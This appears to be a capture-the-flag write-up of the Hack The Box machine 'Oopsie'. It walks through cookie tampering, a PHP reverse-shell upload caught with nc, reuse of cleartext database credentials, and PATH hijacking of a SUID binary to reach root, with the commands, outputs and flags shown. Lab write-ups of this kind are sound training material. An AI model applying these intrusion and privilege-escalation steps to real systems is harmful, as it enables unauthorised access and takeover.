----
## IPs
- victim machine - 10.129.253.197
- Kali - 10.10.14.17
---
## Initial Recon 

- Did the initial scan and found that the target is runnin ssh and a webserver
```shell
map -sC -sV 10.129.254.243

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds
```

- On the site I changed the roles and the user Id in the cookies this showed the upload form on the uploads page.
- I then uploaded a basic php script that starts a shell
- I then ran gobuster find out the location of the script on the server. Found the uploads foled . Didnt find the script that I uploaded on the server so I tried to upload the shell again with adding the  brand  name. I then found the shell
```shell
 gobuster dir -u http://oopsie.htb/uploads -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://oopsie.htb/uploads
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/04/04 09:20:40 Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/shell.php            (Status: 200) [Size: 0]

```

- Uploaded the shell to the server and managed to get a reverse shell by capturing it with nc -lvnp
```shell
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.129.245.74] 49018
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 17:10:53 up 58 min,  0 users,  load average: 0.02, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot

```
- Added a more friendly shell that has tab complete
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'       

www-data@oopsie:/var/www/html/cdn-cgi/login$ 

```

- as www-data only has minimal  we need to get access to a standard usr in the machine. I decided to look at /etc/passwd found that there is a standard user called robert
```shell
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false

```
- decided to try and access the Robert home folder and found the flag.
**f2c74ee8db7983851ab2a96a44eb7981**


- Given that it is a web app i decided to look at the www files to see if there is any info, found passwords in the db.php file
- 
```shell
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
$ 

```

- Logged in as  robert with his password, tried to see what robert can run, he cannot run any thing as he is not part of the sudoers group. He is part of a group called bugtrackers. **Bugtrackers is not a standard group in Linux**

```shell
robert@oopsie:/$ sudo -l
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.
robert@oopsie:/$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
- did a locate bugtracker to see if there is anything related to bugtracker, found a binary
```shell
locate bugtracker

/usr/bin/bugtracker

```

- Got the contents of the binary
```shell
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker

/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
robert@oopsie:/$ 

```

- Found that the bugs are sent the root/reports folder so decide to make cat do the execution by adding temp to path
```shell
cat: /root/reports//bin/bash: No such file or directory

robert@oopsie:/$ cd tmp
cd tmp
robert@oopsie:/tmp$ echo "/bin/sh" > cat        
echo "/bin/sh" > cat
robert@oopsie:/tmp$ chmod +x cat
robert@oopsie:/tmp$ export PATH=/tmp:$PATH
robert@oopsie:/tmp$ 

```

- adding any value to the bugtracker will now execute the binary and add give root access
```shell
echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

# whoami
whoami
root
# 
cd /root
# ls
ls
reports  root.txt
# head root.txt
head root.txt
af13b0bee69f8a877c3faf667f7beacf
# 

```
---
## Tags
#PHP
#Web 
#CustomApplications
#SessionHandling 
#ClearTextCreds
#PathHighJacking
#WebSiteStructureRecon
#SUIDExploitation

----
## Resources

- Gets a php revese shell - https://www.revshells.com/